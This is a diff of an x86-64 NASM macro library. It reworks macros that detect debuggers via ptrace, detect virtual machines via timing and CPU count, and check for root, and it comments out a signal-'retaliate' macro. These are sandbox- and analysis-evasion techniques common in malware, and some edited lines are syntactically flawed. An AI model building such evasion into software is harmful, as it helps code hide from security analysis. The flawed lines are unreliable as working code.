@@ -411,8 +411,6 @@
 ; Returns 1 in RAX if debugging mechanism was detected
 ; Detection is based on simple ptrace(0, 0, 1, 0) method, so nothing new here
 %macro is_debug 1
-    call %%debug_detect
-    %%debug_detect:
     xor rdi, rdi
     xor rsi, rsi
     xor rdx, rdx
@@ -424,11 +422,11 @@
     cmp rax, rcx
     jne %%debugger_present
     xor rax, rax
-    ret
+    jmp %%finish:
     %%debugger_present
     xor rax, rax
     inc rax
-    ret
+    %%finish:
 %endmacro
 
 ; Args -> None
@@ -436,8 +434,6 @@
 ; Detects VM environment by checking for presence of time accelleration mechanism
 ; Returns 1 in RAX if VM was detected; 0 otherwise
 %macro vm_acc 0-1 5
-    call %%vm_detect_init
-    %%vm_detect_init:
     push SYS_TIME
     pop rax
     xor rdi, rdi
@@ -453,11 +449,11 @@
     cmp rdx, %1
     jg %%vm_detected
     xor rax, rax
-    ret
+    jmp %%finish
     %%vm_detected:
     push 1
     pop rax
-    ret
+    %%finish:
 %endmacro
 
 ; Args -> minimum delay between rdtsc (int)
@@ -465,8 +461,6 @@
 ; Detects VM environment by checking for longer delay when rdtsc is issued for retrieving CPU's tick counter
 ; Returns 1 in RAX if VM was detected; 0 otherwise
 %macro vm_tick 0-1 512
-    call %%vm_detect_init
-    %%vm_detect_init:
     rdtsc
     push rax
     pop rbx
@@ -475,11 +469,11 @@
     cmp rax, %1
     jge %%vm_detected
     xor rax, rax
-    ret
+    jmp %%finish
     %%vm_detected:
     push 1
     pop rax
-    ret
+    %%finish:
 %endmacro
 
 ; Args -> minimum delay between rdtsc (int)
@@ -488,8 +482,6 @@
 ; Default trigger for positive detection is 2 cores (or less)
 ; Returns 1 in RAX if VM was detected; 0 otherwise
 %macro vm_cpu 0-1 2
-    call %%vm_detect_init
-    %%vm_detect_init:
     run ""
     file_open ".numcpu"
     push rax
@@ -503,10 +495,10 @@
     xor rax, rax
     cmp rsi, %1
     jle %%vm_detected
-    ret
+    jmp %%finish
     %%vm_detected:
     inc rax
-    ret
+    %%finish:
 %endmacro
 
 ; Args -> filename (string)
@@ -781,7 +773,7 @@
     %%exit_loop:
 %endmacro
 
-; Args -> root_path (string), standard_path (string), loop interval (int), loop unit (unit)
+; Args -> root_path (string), standard_path (string), loop interval (int), time unit (unit)
 ;
 ; Daemonizes current process
 ; Label specified as the first argument (%1) is executed infinitely in a loop  
@@ -1792,9 +1784,9 @@ phdrsize    equ $ - phdr
 ; Args -> variable_name (string without quotes)
 ;
 ; Same as above, but populates 'fsize' variable instead of returning size in RAX.
-%macro get_current_size_var 0-1 fsize 
-    %1 equ $-$$
-%macro
+;%macro get_current_size_var 0-1 fsize 
+;    %1 equ $-$$
+;%macro
 
 
 ; ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ [ = 0x12 = ] ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ 
@@ -1948,8 +1940,6 @@ phdrsize    equ $ - phdr
 ; If elevated privilleges were detected, 1 is returned in RAX
 ; If not, 0 is returned
 %macro is_root 0
-    call %%root_detect
-    %%root_detect:
     push SYS_GETEUID
     pop rax
     syscall
@@ -1957,12 +1947,12 @@ phdrsize    equ $ - phdr
     cmp rax, rbx
     je %%root_present
     xor rax, rax
-    ret
+    jmp %%finish
     %%root_present:
     xor rax, rax
     dec rax
     neg rax
-    ret
+    %%finish:
 %endmacro
 
 ;Args -> None
@@ -2180,11 +2170,11 @@ phdrsize    equ $ - phdr
 ; Args -> num_nops (int)
 ;
 ; Simply inserts a wanted number of NOP instructions
-%macro nops 1
-    %rep %1
-        nop
-    %endrep
-%macro
+;%macro nops 1
+;    %rep %1
+;        nop
+;    %endrep
+;%macro
 
 ; Args -> length (int), [byte] (hex)
 ;
@@ -2269,49 +2259,49 @@ phdrsize    equ $ - phdr
 ; If 'target_whole_procgroup' is set to TRUE, the signal is sent back to the whole process group of the sender
 ; If 'sendback_same_signal' is set to FALSE, the signal that is being sent back is always SIGKILL
 ; If 'exhaust' parameter is set to TRUE, the sender endlessly receives the signal that it has sent (or until it dies)
-%macro retaliate 0-3 SIGKILL,FALSE,TRUE,FALSE
-    fork_label_parent %%continue
-    sig_mask %1
-    push SYS_SIGNALFD
-    pop rax
-    push -1
-    pop rdi
-    xor rdx, rdx
-    push %1
-    pop rsi
-    syscall
-    push rax
-    pop r9
-    %%read_loop:
-    push 2
-    pop rcx
-    push rax
-    pop rdi
-    xor rax, rax
-    reserve_stack_bytes_rel 128, rsi
-    syscall
-    %%get_sender_pid:
-    mov rcx, [rsi+signal_fd_siginfo.ssi_pid]
-    push %2
-    pop r10
-    cmp r10, TRUE
-    je %%get_sigsender_pgid
-    push rcx
-    pop rdi
-    jmp %%send_sig_back
-    %%get_sigsender_pgid:
-    push SYS_GETPGID
-    pop rax
-    push rcx 
-    pop rdi
-    syscall
-    %%send_sig_back:
-    loop %%read_loop
-    %%epilogue:
-    push SYS_CLOSE
-    pop rax
-    push r9
-    pop rdi
-    syscall
-    %%continue:
-%endmacro
+;%macro retaliate 0-3 SIGKILL,FALSE,TRUE,FALSE
+;    fork_label_parent %%continue
+;    sig_mask %1
+;    push SYS_SIGNALFD
+;    pop rax
+;    push -1
+;    pop rdi
+;    xor rdx, rdx
+;    push %1
+;    pop rsi
+;    syscall
+;    push rax
+;    pop r9
+;    %%read_loop:
+;    push 2
+;    pop rcx
+;    push rax
+;    pop rdi
+;    xor rax, rax
+;    reserve_stack_bytes_rel 128, rsi
+;    syscall
+;    %%get_sender_pid:
+;    mov rcx, [rsi+signal_fd_siginfo.ssi_pid]
+;    push %2
+;    pop r10
+;    cmp r10, TRUE
+;    je %%get_sigsender_pgid
+;    push rcx
+;    pop rdi
+;    jmp %%send_sig_back
+;    %%get_sigsender_pgid:
+;    push SYS_GETPGID
+;    pop rax
+;    push rcx 
+;    pop rdi
+;    syscall
+;    %%send_sig_back:
+;    loop %%read_loop
+;    %%epilogue:
+;    push SYS_CLOSE
+;    pop rax
+;    push r9
+;    pop rdi
+;    syscall
+;    %%continue:
+;%endmacro
